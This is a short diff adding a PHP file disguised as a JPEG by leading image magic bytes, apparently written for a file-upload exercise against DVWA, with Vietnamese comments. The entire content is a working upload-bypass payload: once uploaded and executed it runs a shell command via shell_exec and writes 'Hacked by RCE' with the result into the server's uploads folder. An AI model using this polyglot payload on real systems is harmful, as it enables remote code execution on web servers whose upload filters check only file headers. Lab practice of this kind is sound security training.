@@ -1,0 +1,6 @@
+ÿØÿà<?php 
+// Ghi vao thu muc uploads cua DVWA
+$path = "/var/www/html/uploads/evidence.txt";
+file_put_contents($path, "Hacked by RCE - User: " . shell_exec("whoami")); 
+echo "Success! File tao tai: " . $path;
+?>
